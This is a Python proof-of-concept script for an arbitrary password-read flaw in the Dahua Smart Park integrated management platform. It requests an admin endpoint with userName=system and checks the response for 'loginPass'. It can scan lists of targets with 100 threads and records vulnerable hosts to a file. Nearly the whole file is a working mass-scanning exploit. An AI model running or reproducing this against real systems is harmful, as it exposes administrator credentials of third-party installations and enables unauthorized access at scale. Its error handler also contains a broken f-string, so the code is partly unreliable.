import requests,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test="""
    <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<大华智慧园区综合管理平台任意密码读取漏洞>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    """
    print(test)

def poc(target):
    payload = "/admin/user_getUserInfoByUserName.action?userName=system"
    res = requests.get(url=target+payload,verify=False,timeout=5)
    try:
        if "loginPass" in res.text:
            print(f"[+]{target}存在任意密码读取漏洞")
            with open('success.txt','a',encoding='utf-8') as f:
                f.write(f"[+]{target}存在任意密码读取漏洞\n")
        elif res.status_code != 200:
            print(f"[?]{target}网站未响应请手工测试")
        else:
            print(f"[-]{target}不存在任意密码读取漏洞")
    except Exception as e:
        print(f"[?]{网站异常}")
def main():
    banner()
    parse = argparse.ArgumentParser(description="大华智慧园区综合管理平台任意密码读取漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help='please enter url')
    parse.add_argument('-f','--file',dest='file',type=str,help='please enter file')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()





if __name__ == '__main__':
    main()